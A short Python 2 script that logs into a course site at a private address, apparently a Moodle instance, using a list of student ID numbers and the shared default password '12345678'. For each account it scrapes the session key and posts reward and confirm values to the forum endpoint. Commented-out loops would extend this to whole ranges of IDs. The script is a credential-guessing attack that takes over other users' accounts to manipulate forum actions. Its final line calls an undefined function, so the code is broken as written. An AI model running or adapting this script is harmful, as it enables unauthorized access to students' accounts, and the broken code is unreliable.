# -*- coding: utf-8 -*-
import urllib2
import urllib
import cookielib

a=["14061079"]

#for i in range(14061001,14061233):a.append(str(i))
#for i in range(14231001,14231100):a.append(str(i))

#for i in range(13061001,13061233):a.append(str(i))
#for i in range(13231001,13231100):a.append(str(i))	



def dididi(id):
        login_page = "http://10.254.25.5/course/login/index.php"
        url = "http://10.254.25.5/course/my/"
        url2 = "http://10.254.25.5/course/mod/forum/post.php"
        for i in range(len(a)):
                try:
                        cj = cookielib.CookieJar()
                        opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
                        opener.addheaders = [('User-agent','Mozilla/6.0 (compatible; MSIE 6.0; Windows NT 5.1)')]
                        data = urllib.urlencode({"username":a[i],"password":"12345678"})
                        opener.open(login_page,data)
                        op=opener.open(url)
                        content=op.read()
                        qqq=content.find("\",\"loadingicon\":\"http:\/\/10.254.25.5\/course\/theme")
                        skey=content[qqq-10:qqq]
                        data2 = urllib.urlencode({"reward":id,"confirm":id,"sesskey":skey})
                        op=opener.open(url2,data2)
                except:
                        print str(a[i])+"error\n"

fuck("dididi")

